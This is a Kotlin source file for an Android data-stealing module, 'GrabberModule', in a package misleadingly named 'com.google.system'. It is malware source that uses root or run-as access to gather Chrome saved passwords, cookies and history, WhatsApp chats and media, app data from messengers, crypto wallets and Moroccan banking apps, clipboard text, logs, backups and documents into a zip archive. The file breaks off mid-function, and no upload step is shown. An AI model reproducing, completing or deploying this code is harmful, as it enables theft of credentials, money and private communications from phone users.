package com.google.system

import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.database.sqlite.SQLiteDatabase
import android.net.Uri
import android.os.Build
import android.os.Environment
import java.io.BufferedReader
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object GrabberModule {

    private val HIGH_VALUE_APPS = mapOf(
        "com.discord" to "Discord",
        "com.aliucord" to "Aliucord",
        "org.telegram.messenger" to "Telegram",
        "org.telegram.messenger.web" to "Telegram Web",
        "org.thoughtcrime.securesms" to "Signal",
        "com.whatsapp" to "WhatsApp",
        "com.instagram.android" to "Instagram",
        "com.facebook.katana" to "Facebook",
        "com.twitter.android" to "Twitter/X",
        "com.snapchat.android" to "Snapchat",
        "com.zhiliaoapp.musically" to "TikTok",
        "com.netflix.mediaclient" to "Netflix",
        "com.spotify.music" to "Spotify",
        "com.amazon.mShop.android.shopping" to "Amazon",
        "com.paypal.android.p2pmobile" to "PayPal",
        "com.coinbase.android" to "Coinbase",
        "com.binance.dev" to "Binance",
        "io.metamask" to "MetaMask",
        "com.wallet.crypto.trustapp" to "Trust Wallet",
        "com.phantom" to "Phantom",
        "com.exodus.exodus" to "Exodus",
        "com.blockchainvault" to "Blockchain.com",
        "com.google.android.youtube" to "YouTube",
        "com.microsoft.office.outlook" to "Outlook",
        "com.google.android.gm" to "Gmail",
        "com.dropbox.android" to "Dropbox",
        "com.google.android.apps.docs" to "Google Docs",
    )

    private val BROWSERS = mapOf(
        "com.android.chrome" to "Chrome",
        "com.chrome.beta" to "Chrome Beta",
        "com.chrome.dev" to "Chrome Dev",
        "com.brave.browser" to "Brave",
        "com.microsoft.emmx" to "Edge",
        "com.opera.browser" to "Opera",
        "com.opera.gx" to "Opera GX",
        "org.mozilla.firefox" to "Firefox",
        "com.sec.android.app.sbrowser" to "Samsung Browser",
        "com.duckduckgo.mobile.android" to "DuckDuckGo",
        "com.vivaldi.browser" to "Vivaldi",
    )

    private val BANKS_MOROCCO = mapOf(
        "com.attijariwafabank.main" to "Attijariwafa Bank",
        "ma.gbp.pocketbank" to "Banque Populaire",
        "com.b3g.cih.online" to "CIH Bank",
        "ma.creditagricole.banke" to "Crédit Agricole",
        "com.sgma.prod" to "Société Générale",
        "com.mysoge.prod" to "SoGé",
        "com.BMCE_prod.bad" to "BMCE Direct",
        "com.cfgbank.mobileapp" to "CFG Bank",
        "ma.gbp.bpay" to "BPAY",
        "com.cashplus.mobileapp" to "Cash Plus",
    )

    private val SENSITIVE_PATTERNS = listOf(
        "password", "passwd", "pwd", "secret", "token", "auth", "login",
        "credential", "key", "cert", "private", "wallet", "seed", "mnemonic",
        "backup", "config", "api_key", "apikey", "access_token", "refresh_token",
        "bearer", "session", "cookie", "oauth", "jwt", "account", "profile",
        "user_data", "userdata", "settings", "database", "preferences",
        "pin", "cvv", "cvc", "ssn", "identity", "passport", "id_card",
    )

    private val HIGH_VALUE_EXTS = setOf(
        ".key", ".pem", ".crt", ".p12", ".keystore", ".jks",
        ".env", ".config", ".ini", ".yml", ".yaml", ".toml",
        ".json", ".xml", ".db", ".sqlite", ".sql",
        ".wallet", ".dat", ".bak", ".backup",
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".txt", ".rtf", ".csv", ".log",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
        ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv",
        ".zip", ".rar", ".7z", ".tar", ".gz",
        ".kdbx", ".kdb", ".ovpn", ".conf",
        ".html", ".htm", ".php", ".asp", ".aspx",
        ".der", ".cer", ".pfx",
    )

    private val CLIPBOARD_KEYWORDS = listOf(
        "password", "token", "key", "secret", "auth",
        "bitcoin", "btc", "eth", "ethereum", "sol", "solana",
        "0x", "bc1", "private", "seed", "mnemonic",
        "api_key", "apikey", "access_token", "refresh_token",
        "bearer", "authorization", "credit", "card", "cvv",
        "pin", "login", "username", "password",
    )

    private const val MAX_ZIP = 50L * 1024 * 1024
    private const val MAX_FILE = 5L * 1024 * 1024
    private const val MAX_FILES = 100

    fun grabAll(ctx: Context) = grab(ctx, "all", deep = true)
    fun grabBrowser(ctx: Context) = grab(ctx, "browser", deep = true)
    fun grabMessenger(ctx: Context) = grab(ctx, "messenger", deep = true)
    fun grabTokens(ctx: Context) = grab(ctx, "tokens", deep = true)
    fun grabWallets(ctx: Context) = grab(ctx, "wallets", deep = true)
    fun grabFiles(ctx: Context) = grab(ctx, "files", deep = true)
    fun grabClipboard(ctx: Context) = grab(ctx, "clipboard", deep = false)
    fun grabBanks(ctx: Context) = grab(ctx, "banks", deep = true)
    fun grabWhatsApp(ctx: Context) = grab(ctx, "whatsapp", deep = true)
    fun grabChrome(ctx: Context) = grab(ctx, "chrome", deep = true)
    fun grabDocs(ctx: Context) = grab(ctx, "docs", deep = true)

    fun grab(ctx: Context, target: String, deep: Boolean = false): GrabResult {
        val installed = ctx.packageManager.getInstalledPackages(0).map { it.packageName }.toSet()
        val hasRoot = checkRoot()
        val r = GrabResult(hasRoot = hasRoot, installedCount = installed.size)
        val zipFile = File(ctx.cacheDir, "grab_${target}_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                val report = GrabReport()
                when (target) {
                    "all" -> {
                        deepScanApps(ctx, installed, hasRoot, zos, r)
                        deepScanStorage(ctx, zos, r)
                        deepScanContentProviders(ctx, zos, r)
                        deepScanLogs(ctx, zos, r)
                        deepScanBackups(ctx, zos, r)
                        deepScanBanks(ctx, installed, hasRoot, zos, r)
                        extractWhatsAppAll(ctx, hasRoot, zos, r)
                        extractChromeAll(ctx, hasRoot, zos, r, report)
                        scanClipboard(ctx, zos, r)
                    }
                    "browser" -> deepScanBrowsers(ctx, installed, hasRoot, zos, r)
                    "messenger" -> deepScanMessengers(ctx, installed, hasRoot, zos, r)
                    "tokens" -> deepScanTokens(ctx, installed, hasRoot, zos, r)
                    "wallets" -> deepScanWallets(ctx, installed, hasRoot, zos, r)
                    "files" -> deepScanStorage(ctx, zos, r)
                    "clipboard" -> scanClipboard(ctx, zos, r)
                    "banks" -> deepScanBanks(ctx, installed, hasRoot, zos, r)
                    "whatsapp" -> extractWhatsAppAll(ctx, hasRoot, zos, r)
                    "chrome" -> extractChromeAll(ctx, hasRoot, zos, r, report)
                    "docs" -> deepScanDocuments(ctx, zos, r)
                    else -> {
                        deepScanApps(ctx, installed, hasRoot, zos, r)
                        deepScanStorage(ctx, zos, r)
                        deepScanContentProviders(ctx, zos, r)
                        deepScanBanks(ctx, installed, hasRoot, zos, r)
                        scanClipboard(ctx, zos, r)
                    }
                }
                report.files = r.files
                report.size = r.size
                report.highValue = r.highValue
                r.report = report.build()
            }
            if (zipFile.exists() && zipFile.length() > 0) {
                r.file = zipFile
                r.size = zipFile.length()
            } else {
                zipFile.delete()
            }
        } catch (e: Exception) {
            r.error = e.message
            zipFile.delete()
        }
        return r
    }

    private var rootCached = false
    private var rootAvailable = false

    private fun checkRoot(): Boolean {
        if (rootCached) return rootAvailable
        rootCached = true
        val paths = listOf("/system/bin/su", "/system/xbin/su", "/sbin/su", "/su/bin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/app/Superuser.apk")
        if (paths.any { File(it).exists() }) {
            rootAvailable = true
            return true
        }
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
            val output = p.inputStream.bufferedReader().readText()
            p.waitFor()
            p.inputStream.close()
            rootAvailable = output.contains("uid=0")
            rootAvailable
        } catch (_: Exception) { false }
    }

    private fun runCommand(cmd: String): String {
        return try {
            val useRoot = checkRoot()
            val p = if (useRoot) Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
                     else Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val reader = BufferedReader(InputStreamReader(p.inputStream))
            val output = reader.readText()
            reader.close()
            p.inputStream.close()
            p.errorStream?.close()
            p.waitFor()
            p.destroy()
            output
        } catch (_: Exception) { "" }
    }

    private fun deepScanApps(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        deepScanBrowsers(ctx, installed, hasRoot, zos, r)
        deepScanMessengers(ctx, installed, hasRoot, zos, r)
        deepScanTokens(ctx, installed, hasRoot, zos, r)
        deepScanWallets(ctx, installed, hasRoot, zos, r)
    }

    private fun deepScanBrowsers(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in BROWSERS) {
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "browser", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "browser", zos, r)
        }
    }

    private fun deepScanMessengers(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (BROWSERS.containsKey(pkg)) continue
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "messenger", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "messenger", zos, r)
        }
    }

    private fun deepScanTokens(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (BROWSERS.containsKey(pkg) || isWallet(pkg)) continue
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "tokens", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "tokens", zos, r)
        }
    }

    private fun deepScanWallets(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (!isWallet(pkg)) continue
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "wallets", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "wallets", zos, r)
        }
    }

    private fun deepScanBanks(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in BANKS_MOROCCO) {
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "banks", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "banks", zos, r)
            r.banksFound++
        }
    }

    private fun deepScanDocuments(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        val docExts = setOf(".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".rtf", ".csv")
        val dirs = listOfNotNull(
            Environment.getExternalStorageDirectory(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            File("/sdcard/Download"),
            File("/sdcard/Documents"),
            File("/sdcard/WhatsApp"),
        )
        val found = mutableListOf<File>()
        for (root in dirs) {
            if (found.size >= MAX_FILES || r.size >= MAX_ZIP) break
            if (root.exists() && root.canRead()) collectDeepExts(root, found, MAX_FILES, docExts)
        }
        for (f in found) {
            if (r.size >= MAX_ZIP) break
            val root = dirs.firstOrNull { f.absolutePath.startsWith(it.absolutePath) } ?: continue
            val rel = f.absolutePath.substring(root.absolutePath.length + 1)
            if (zip(f, "documents/$rel", zos)) { r.files++; r.size += f.length(); r.docsFound++ }
        }
    }

    private fun scanAppDataDir(pkg: String, name: String, category: String, zos: ZipOutputStream, r: GrabResult, hasRoot: Boolean) {
        val dir = File("/data/data/$pkg")
        if (dir.exists() && dir.canRead()) {
            scanDirRecursive(dir, "$category/$name", zos, r)
        } else if (hasRoot) {
            val output = runCommand("find /data/data/$pkg -type f -size +0c -size -5M 2>/dev/null | head -50")
            for (path in output.lines()) {
                if (path.isBlank() || r.size >= MAX_ZIP || r.files >= MAX_FILES) continue
                val f = File(path)
                if (f.exists() && f.length() in 1..MAX_FILE) {
                    val rel = path.substring("/data/data/$pkg/".length)
                    if (zip(f, "$category/$name/root_$rel", zos)) {
                        r.files++; r.size += f.length()
                        if (isSensitive(f.name)) r.highValue++
                    }
                }
            }
        } else {
            val output = runCommand("run-as $pkg ls / 2>/dev/null")
            if (output.isNotBlank()) {
                val files = runCommand("run-as $pkg find / -type f 2>/dev/null | head -50")
                for (path in files.lines()) {
                    if (path.isBlank() || r.size >= MAX_ZIP || r.files >= MAX_FILES) continue
                    val content = runCommand("run-as $pkg cat $path 2>/dev/null")
                    if (content.isNotBlank() && content.length < MAX_FILE.toInt()) {
                        val rel = path.trimStart('/', ' ')
                        val entryName = "$category/$name/runas_$rel"
                        try {
                            zos.putNextEntry(ZipEntry(entryName))
                            zos.write(content.toByteArray())
                            zos.closeEntry()
                            r.files++; r.size += content.length
                            if (isSensitive(rel)) r.highValue++
                        } catch (e: Exception) {
                            android.util.Log.e("GrabberModule", "Runas scan failed", e)
                        }
                    }
                }
            }
        }
    }

    private fun scanExternalAppData(ctx: Context, pkg: String, name: String, category: String, zos: ZipOutputStream, r: GrabResult) {
        val roots = listOfNotNull(
            Environment.getExternalStorageDirectory(),
            ctx.getExternalFilesDir(null)?.parentFile?.parentFile?.parentFile,
        )
        for (root in roots) {
            val extData = File(root, "Android/data/$pkg")
            if (extData.exists() && extData.canRead()) {
                scanDirRecursive(extData, "$category/$name/external", zos, r)
            }
        }
    }

    private fun scanDirRecursive(dir: File, zipPrefix: String, zos: ZipOutputStream, r: GrabResult) {
        if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
        try {
            val files = dir.listFiles() ?: return
            for (f in files) {
                if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
                if (f.isDirectory) {
                    scanDirRecursive(f, "$zipPrefix/${f.name}", zos, r)
                } else if (f.isFile && f.length() in 1..MAX_FILE) {
                    if (isSensitive(f.name) || f.extension.lowercase() in HIGH_VALUE_EXTS ||
                        f.name.equals("Cookies", ignoreCase = true) ||
                        f.name.equals("Login Data", ignoreCase = true) ||
                        f.name.equals("Web Data", ignoreCase = true) ||
                        f.name.equals("History", ignoreCase = true)) {
                        if (zip(f, "$zipPrefix/${f.name}", zos)) {
                            r.files++; r.size += f.length()
                            if (isSensitive(f.name)) r.highValue++
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun deepScanStorage(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        val dirs = listOfNotNull(
            Environment.getExternalStorageDirectory(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            File(Environment.getExternalStorageDirectory(), "Android/data"),
            File("/sdcard/Download"),
            File("/sdcard/Documents"),
            File("/sdcard/DCIM"),
            File("/sdcard/Pictures"),
            File("/sdcard/Music"),
            File("/sdcard/WhatsApp"),
        )
        val found = mutableListOf<File>()
        for (root in dirs) {
            if (found.size >= MAX_FILES || r.size >= MAX_ZIP) break
            if (root.exists() && root.canRead()) collectDeep(root, found, MAX_FILES)
        }
        for (f in found) {
            if (r.size >= MAX_ZIP) break
            val root = dirs.firstOrNull { f.absolutePath.startsWith(it.absolutePath) } ?: continue
            val rel = f.absolutePath.substring(root.absolutePath.length + 1)
            if (zip(f, "storage/$rel", zos)) { r.files++; r.size += f.length() }
        }
    }

    private fun deepScanContentProviders(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        try {
            val pm = ctx.packageManager
            val packages = pm.getInstalledPackages(PackageManager.GET_PROVIDERS)
            for (pkgInfo in packages) {
                if (r.files >= MAX_FILES) break
                val providers = pkgInfo.providers ?: continue
                for (provider in providers) {
                    if (r.files >= MAX_FILES) break
                    if (!provider.exported) continue
                    val authority = provider.authority ?: continue
                    val uri = Uri.parse("content://$authority")
                    try {
                        val cursor = ctx.contentResolver.query(uri, null, null, null, null)
                        if (cursor != null) {
                            val cols = cursor.columnNames.joinToString("\t")
                            val rows = mutableListOf<String>()
                            var count = 0
                            while (cursor.moveToNext() && count < 100) {
                                val row = (0 until cursor.columnCount).map { cursor.getString(it) ?: "null" }.joinToString("\t")
                                rows.add(row)
                                count++
                            }
                            cursor.close()
                            if (rows.isNotEmpty()) {
                                val content = "$cols\n${rows.joinToString("\n")}\n"
                                val entryName = "providers/${pkgInfo.packageName}/${authority.replace('.', '_')}.tsv"
                                zos.putNextEntry(ZipEntry(entryName))
                                zos.write(content.toByteArray())
                                zos.closeEntry()
                                r.files++; r.size += content.length; r.highValue++
                            }
                        }
                    } catch (e: Exception) {
                        android.util.Log.e("GrabberModule", "Error scanning directory", e)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun deepScanLogs(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        try {
            val output = runCommand("logcat -d -t 5000")
            if (output.isNotBlank()) {
                val sensitiveLines = output.lines().filter { line ->
                    val lower = line.lowercase()
                    SENSITIVE_PATTERNS.any { lower.contains(it) } || CLIPBOARD_KEYWORDS.any { lower.contains(it) }
                }
                if (sensitiveLines.isNotEmpty()) {
                    val content = sensitiveLines.take(500).joinToString("\n")
                    zos.putNextEntry(ZipEntry("logs/sensitive_logcat.txt"))
                    zos.write(content.toByteArray())
                    zos.closeEntry()
                    r.files++; r.size += content.length; r.highValue++
                }
            }
        } catch (_: Exception) {}
    }

    private fun deepScanBackups(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        val backupDirs = listOf(
            "/data/media/0",
            "/sdcard/",
            "/storage/emulated/0/",
        )
        val backupPatterns = listOf(".backup", ".bak", "backup_", "_backup", "backup.tar", "backup.zip", "backup.db")
        for (dir in backupDirs) {
            if (r.files >= MAX_FILES || r.size >= MAX_ZIP) break
            val d = File(dir)
            if (d.exists() && d.canRead()) {
                scanForBackups(d, backupPatterns, zos, r)
            }
        }
    }

    private fun scanForBackups(dir: File, patterns: List<String>, zos: ZipOutputStream, r: GrabResult) {
        if (r.files >= MAX_FILES || r.size >= MAX_ZIP) return
        try {
            val files = dir.listFiles() ?: return
            for (f in files) {
                if (r.files >= MAX_FILES || r.size >= MAX_ZIP) return
                if (f.isDirectory && f.name !in listOf("system", "proc", "sys", "dev")) {
                    scanForBackups(f, patterns, zos, r)
                } else if (f.isFile && f.length() < MAX_FILE) {
                    val nameLower = f.name.lowercase()
                    if (patterns.any { nameLower.contains(it) }) {
                        if (zip(f, "backups/${f.name}", zos)) {
                            r.files++; r.size += f.length(); r.highValue++
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun scanClipboard(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).coerceToText(ctx).toString()
                if (text.isNotBlank()) {
                    val matches = CLIPBOARD_KEYWORDS.filter { text.lowercase().contains(it) }
                    val content = buildString {
                        appendLine("=== CLIPBOARD ===")
                        appendLine("Time: ${System.currentTimeMillis()}")
                        appendLine("Length: ${text.length}")
                        if (matches.isNotEmpty()) appendLine("ALERT: ${matches.joinToString(", ")}")
                        appendLine()
                        appendLine(text)
                    }
                    zos.putNextEntry(ZipEntry("clipboard/current.txt"))
                    zos.write(content.toByteArray())
                    zos.closeEntry()
                    r.files++
                    r.size += content.length
                    if (matches.isNotEmpty()) r.highValue++
                }
            }
        } catch (_: Exception) {}
    }

    private fun extractWhatsAppAll(ctx: Context, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        if (!hasRoot) return
        try {
            val dbPath = "/data/data/com.whatsapp/databases/msgstore.db"
            val cacheCopy = File(ctx.cacheDir, "wa_msgstore_${System.currentTimeMillis()}.db")
            runCommand("cp $dbPath ${cacheCopy.absolutePath}")
            if (!cacheCopy.exists() || cacheCopy.length() < 1024) return

            val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
            try {
                val query = """SELECT c.wa_name, m.text_data, m.timestamp 
                    FROM messages m 
                    JOIN chat_view c ON m.chat_row_id = c._id 
                    WHERE m.text_data IS NOT NULL 
                    ORDER BY c.wa_name, m.timestamp ASC"""
                val cursor = db.rawQuery(query, null)
                val chatMap = linkedMapOf<String, MutableList<String>>()
                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                var msgCount = 0
                while (cursor.moveToNext()) {
                    val contact = cursor.getString(0) ?: "Unknown"
                    val text = cursor.getString(1) ?: ""
                    val ts = cursor.getLong(2)
                    val date = if (ts > 0) dateFormat.format(Date(ts * 1000)) else "unknown"
                    val line = "[$date] $text"
                    chatMap.getOrPut(contact) { mutableListOf() }.add(line)
                    msgCount++
                }
                cursor.close()

                for ((contact, messages) in chatMap) {
                    val safeName = contact.replace("/", "_").replace(":", "_").replace(" ", "_").take(50)
                    val content = buildString {
                        appendLine("=== WhatsApp Chat: $contact ===")
                        appendLine("Total messages: ${messages.size}")
                        appendLine("Exported: ${dateFormat.format(Date())}")
                        appendLine()
                        messages.forEach { appendLine(it) }
                    }
                    zos.putNextEntry(ZipEntry("whatsapp/chats/${safeName}.txt"))
                    zos.write(content.toByteArray())
                    zos.closeEntry()
                    r.files++
                    r.size += content.length
                }

                r.whatsappChats = chatMap.size
                r.whatsappMessages = msgCount

                val mediaDir = File("/data/data/com.whatsapp/files/Media")
                if (mediaDir.exists()) {
                    scanWhatsAppMedia(mediaDir, zos, r)
                }
            } finally {
                db.close()
                cacheCopy.delete()
            }
        } catch (_: Exception) {}
    }

    private fun scanWhatsAppMedia(dir: File, zos: ZipOutputStream, r: GrabResult) {
        if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
        try {
            val files = dir.listFiles() ?: return
            for (f in files) {
                if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
                if (f.isDirectory) {
                    if (f.name.equals("Sent", ignoreCase = true) || f.name.equals("Received", ignoreCase = true)) {
                        scanWhatsAppMedia(f, zos, r)
                    }
                } else if (f.isFile && f.length() in 1024..MAX_FILE) {
                    val ext = f.extension.lowercase()
                    if (ext in listOf("jpg", "jpeg", "png", "gif", "mp4", "avi", "ogg", "opus", "m4a")) {
                        if (zip(f, "whatsapp/media/${f.name}", zos)) {
                            r.files++; r.size += f.length()
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun extractChromeAll(ctx: Context, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult, report: GrabReport) {
        if (!hasRoot) return
        try {
            val chromeDirs = listOf(
                "/data/data/com.android.chrome/app_chrome/Default/",
                "/data/data/com.android.chrome/app_chrome/Profile 1/",
            )
            for (baseDir in chromeDirs) {
                if (r.files >= MAX_FILES || r.size >= MAX_ZIP) break
                val historyFile = File("${baseDir}History")
                val loginFile = File("${baseDir}Login Data")
                val cookiesFile = File("${baseDir}Cookies")

                if (historyFile.exists()) extractChromeHistory(historyFile, ctx, zos, r, report)
                if (loginFile.exists()) extractChromePasswords(loginFile, ctx, zos, r, report)
                if (cookiesFile.exists()) extractChromeCookies(cookiesFile, ctx, zos, r)
            }
        } catch (_: Exception) {}
    }

    private fun extractChromeHistory(historyFile: File, ctx: Context, zos: ZipOutputStream, r: GrabResult, report: GrabReport) {
        try {
            val cacheCopy = File(ctx.cacheDir, "chrome_history_${System.currentTimeMillis()}")
            runCommand("cp ${historyFile.absolutePath} ${cacheCopy.absolutePath}")
            if (!cacheCopy.exists() || cacheCopy.length() < 256) return

            val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
            try {
                val query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500"
                val cursor = db.rawQuery(query, null)
                val entries = mutableListOf<String>()
                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                val chromeEpoch = 11644473600000L

                while (cursor.moveToNext()) {
                    val url = cursor.getString(0) ?: ""
                    val title = cursor.getString(1) ?: ""
                    val visits = cursor.getInt(2)
                    val lastVisit = cursor.getLong(3)
                    val date = if (lastVisit > 0) dateFormat.format(Date((lastVisit / 10) - chromeEpoch)) else "unknown"
                    entries.add("$date | $url | $title | $visits visits")
                }
                cursor.close()

                if (entries.isNotEmpty()) {
                    val content = buildString {
                        appendLine("=== Chrome History ===")
                        appendLine("Total entries: ${entries.size}")
                        appendLine("Exported: ${dateFormat.format(Date())}")
                        appendLine()
                        appendLine("Timestamp | URL | Title | Visits")
                        appendLine("-".repeat(80))
                        entries.forEach { appendLine(it) }
                    }
                    zos.putNextEntry(ZipEntry("chrome/history.txt"))
                    zos.write(content.toByteArray())
                    zos.closeEntry()
                    r.files++; r.size += content.length
                    report.chromeUrls = entries.size
                }
            } finally {
                db.close()
                cacheCopy.delete()
            }
        } catch (_: Exception) {}
    }

    private fun extractChromePasswords(loginFile: File, ctx: Context, zos: ZipOutputStream, r: GrabResult, report: GrabReport) {
        try {
            val cacheCopy = File(ctx.cacheDir, "chrome_login_${System.currentTimeMillis()}")
            runCommand("cp ${loginFile.absolutePath} ${cacheCopy.absolutePath}")
            if (!cacheCopy.exists() || cacheCopy.length() < 256) return

            val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
            try {
                val query = "SELECT origin_url, username_value, password_value FROM logins ORDER BY origin_url ASC"
                val cursor = db.rawQuery(query, null)
                val entries = mutableListOf<String>()
                var savedCount = 0

                while (cursor.moveToNext()) {
                    val url = cursor.getString(0) ?: ""
                    val username = cursor.getString(1) ?: ""
                    val passwordBytes = cursor.getBlob(2)
                    val password = if (passwordBytes != null) String(passwordBytes) else ""
                    entries.add("$url | User: $username | Pass: $password")
                    savedCount++
                }
                cursor.close()

                if (entries.isNotEmpty()) {
                    val content = buildString {
                        appendLine("=== Chrome Saved Passwords ===")
                        appendLine("Total: $savedCount")
                        appendLine("Exported: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())}")
                        appendLine()
                        entries.forEach { appendLine(it) }
                    }
                    zos.putNextEntry(ZipEntry("chrome/passwords.txt"))
                    zos.write(content.toByteArray())
                    zos.closeEntry()
                    r.files++; r.size += content.length
                    r.highValue += savedCount
                    report.chromePasswords = savedCount
                }
            } finally {
                db.close()
                cacheCopy.delete()
            }
        } catch (_: Exception) {}
    }

    private fun extractChromeCookies(cookiesFile: File, ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        try {
            val cacheCopy = File(ctx.cacheDir, "chrome_cookies_${System.currentTimeMillis()}")
            runCommand("cp ${cookiesFile.absolutePath} ${cacheCopy.absolutePath}")
            if (!cacheCopy.exists() || cacheCopy.length() < 256) return

            val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
            try {
                val query = "SELECT host_key, name, value, path, expires_utc FROM cookies ORDER BY host_key ASC LIMIT 200"
                val cursor = db.rawQuery(query, null)
                val entries = mutableListOf<String>()
                while (cursor.moveToNext()) {
                    val host = cursor.getString(0) ?: ""
                    val name = cursor.getString(1) ?: ""
                    val value = cursor.getString(2) ?: ""
                    val path = cursor.getString(3) ?: ""
                    entries.add("$host$path | $name = $value")
                }
                cursor.close()

                if (entries.isNotEmpty()) {
                    val content = buildString {
                        appendLine("=== Chrome Cookies ===")
                        appendLine("Total: ${entries.size}")
                        entries.forEach { appendLine(it) }
                    }
                    zos.putNextEntry(ZipEntry("chrome/cookies.txt"))
                    zos.write(content.toByteArray())
                    zos.closeEntry()
                    r.files++; r.size += content.length
                }
            } finally {
                db.close()
                cacheCopy.delete()
            }
        } catch (_: Exception) {}
    }

    private fun collectDeep(dir: File, found: MutableList<File>, max: Int) {
        if (found.size >= max) return
        try {
            val files = dir.listFiles() ?: return
            for (f in files.sortedByDescending { it.length() }) {
                if (found.size >= max) return
                if (f.isDirectory) collectDeep(f, found, max)
                else if (f.isFile && f.length() in 1..MAX_FILE) {
                    val n = f.name.lowercase()
                    if (SENSITIVE_PATTERNS.any { n.contains(it) } || HIGH_VALUE_EXTS.any { n.endsWith(it) }) {
                        found.add(f)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun collectDeepExts(dir: File, found: MutableList<File>, max: Int, exts: Set<String>) {
        if (found.size >= max) return
        try {
            val files = dir.listFiles() ?: return
            for (f in files.sortedByDescending { it.length() }) {
                if (found.size >= max) return
                if (f.isDirectory) collectDeepExts(f, found, max, exts)
                else if (f.isFile && f.length() in 1..MAX_FILE) {
                    if (exts.any { f.name.lowercase().endsWith(it) }) {
                        found.add(f)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun zip(file: File, entryName: String, zos: ZipOutputStream): Boolean {
        return try {
            zos.putNextEntry(ZipEntry(entryName))
            FileInputStream(file).use { fis ->
                val buf = ByteArray(8192)
                var n: Int
                while (fis.read(buf).also { n = it } > 0) zos.write(buf, 0, n)
            }
            zos.closeEntry()
            true
        } catch (_: Exception) { false }
    }

    private fun isSensitive(name: String): Boolean {
        val n = name.lowercase()
        return SENSITIVE_PATTERNS.any { n.contains(it) } || HIGH_VALUE_EXTS.any { n.endsWith(it) }
    }

    private fun isWallet(pkg: String) = pkg.contains("wallet") || pkg.contains("coin") ||
        pkg.contains("crypto") || pkg.contains("metamask") || pkg.contains("phantom") ||
        pkg.contains("trust") || pkg.contains("exodus") || pkg.contains("blockchain") ||
        pkg.contains("binance")

    private fun listFiles(path: String, max: Int = 100): String {
